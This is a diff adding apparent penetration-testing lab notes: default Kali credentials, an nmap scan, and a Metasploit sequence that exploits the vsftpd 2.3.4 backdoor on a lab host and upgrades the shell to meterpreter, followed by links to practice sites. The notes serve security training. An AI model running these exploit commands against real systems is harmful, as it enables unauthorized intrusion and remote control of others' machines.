@@ -1,0 +1,62 @@
+https://bit.ly/2W4dj3o
+
+Username: root
+Password: toor
+
+
+https://github.com/tjflaagan/Gencyber/tree/master/InstallScripts
+
+
+
+tools.kali.org
+
+git clone https://github.com/leebaird/discover.git
+
+
+CRRC_PT2_User
+
+ DHCP:192.168.103.XXX	
+
+ Network to Scan 192.168.1.0/24
+Save nmap to file: -oA <file name>
+
+
+
+nmap -sT -sV -Pn -n -T4 --open 172.17.0.2 
+
+
+
+
+
+
+
+
+
+
+
+
+msfconsole
+search vsftpd 
+use exploit/unix/ftp/vsftpd_234_backdoor
+setg rhosts 172.17.0.2
+set payload cmd/unix/interact 
+exploit
+
+<Background the session>
+
+search meterpreter
+use post/multi/manage/shell_to_meterpreter
+set lhost 172.17.0.1
+set session 1
+exploit
+sessions 
+sessions -i 2
+
+
+vulnhub.com
+hackthebox.eu
+overthewire.com
+underthewire.tech
+ctftime.org
+https://inventory.rawsec.ml/index.html
+
